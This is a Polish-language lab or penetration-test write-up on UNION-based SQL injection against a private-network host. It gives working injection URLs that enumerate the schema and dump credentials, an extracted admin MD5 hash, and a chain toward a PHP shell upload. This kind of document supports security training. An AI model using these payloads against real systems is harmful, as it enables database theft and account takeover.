# UNION-based SQL Injection & Data Extraction

## Cel testów
Weryfikacja podatności typu UNION-based SQL Injection, enumeracja struktury bazy danych oraz ekstrakcja haseł administracyjnych.

---

## Część 1: Struktura zapytania SQL

Parametr `id` został potwierdzony jako podatny na SQL Injection.

### Określenie liczby kolumn

Poprzednie testy wykazały:
- Liczba kolumn: **4**
- Przynajmniej jedna kolumna jest reflektowana w odpowiedzi HTTP
- Możliwość wykonania UNION SELECT

---

## Część 2: UNION SELECT – Identyfikacja bazy danych

### Testowanie wersji MySQL

```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,version(),3,4
```

**Wynik:**
```
MySQL: 5.1.63-0+squeeze1
```

![MySQL version](../img/image.png)

---

## Część 3: Enumeracja struktury bazy danych

### 3.1. Wylistowanie wszystkich tabel

```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables
```

**Istotne tabele:**
- `users` – dane logowania użytkowników
- `pictures` – zdjęcia i metadane
- `categories` – kategorie zdjęć

### 3.2. Kolumny tabeli users

```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'
```

**Wynik:**
- id
- login
- password

![Kolumny tabeli users](../img/image.png)

### 3.3. Pełna struktura bazy

```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,CONCAT(table_name,':',column_name),3,4 FROM information_schema.columns WHERE table_schema=database()
```

![Pełna struktura](../img/image.png)

**Struktura:**

| Tabela | Kolumny |
|--------|---------|
| users | id, login, password |
| pictures | id, title, img, cat |
| categories | id, title |

---

## Część 4: Ekstrakcja danych wrażliwych

### 4.1. Hash hasła administratora

```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,CONCAT(login,':',password),3,4 FROM users
```

**Wynik (Hash MD5):**
```
admin:8efe310f9ab3efeae8d410a8e0166eb2
```

![Admin hash](../img/image.png)

Hash został odhaszowany za pomocą algorytmu MD5.

![Hash decrypted](../img/image.png)

---

### 4.2. Panel administracyjny – Uzyskanie dostępu

Po odhaszowaniu hasła uzyskaliśmy dostęp do konta administratora.

![Admin login](../img/image.png)

**Dostępne funkcje w panelu:**
- Przeglądanie listy zdjęć
- Dodawanie nowych zdjęć
- Usuwanie zdjęć

![Admin panel](../img/image.png)

---

### 4.3. Wykrycie zalecanej luki – Upload plików

```
http://192.168.56.6/cat?id=-1 UNION SELECT 1,CONCAT(id,':',title,':',img),3,4 FROM pictures
```

**Wyekstraktowane dane:**
```
1:hacker:hacker.png
2:ruby:ruby.jpg
3:cthulhu:cthulhu.png
6:danger_cat:cat_in_balaclava.jpeg
8:reversedphp:shell.php3
```

![Picture data](../img/image.png)

**Istotne obserwacje:**
- Wpis `reversedphp` wskazuje na shell PHP (`shell.php3`)
- Panel administracyjny umożliwia upload plików
- Brak walidacji rozszerzenia i zawartości plików

---

## Część 5: Podsumowanie podatności

### Zidentyfikowane luki:

1. **UNION-based SQL Injection** – Możliwość użycia UNION SELECT do ekstrakcji danych
2. **Ekspozycja metadanych bazy** – Pełny dostęp do `information_schema`
3. **Brak kontroli dostępu do panelu admina** – Niechroniony dostęp po odhaszowaniu hasła
4. **Możliwość uploadu plików** – Panel administracyjny umożliwia przesłanie plików (potencjalny RCE)
5. **Poprzednie podatności** – SQL Injection, brak sanitizacji (zobacz plik 3: SQL Injection Basics)

### Wpływ zagrożenia:

- **Poufność:** Pełna kompromitacja bazy danych (login, hasła, dane zdjęć)
- **Integralność:** Możliwość modyfikacji danych poprzez upload (shell PHP)
- **Dostępność:** Potencjalny RCE (Remote Code Execution) na serwerze
- **Eskalacja ataku:** Łańcuch od SQL Injection → Admin Access → File Upload → RCE

### Ocena ryzyka:

- **Poziom:** KRYTYCZNY
- **CVSS:** 9.9 (Critical)
- **Wpływ na biznes:** Kompletna kompromitacja aplikacji i serwera
- **Czas do eksploitacji:** < 15 minut (bez walidacji i zabezpieczeń)
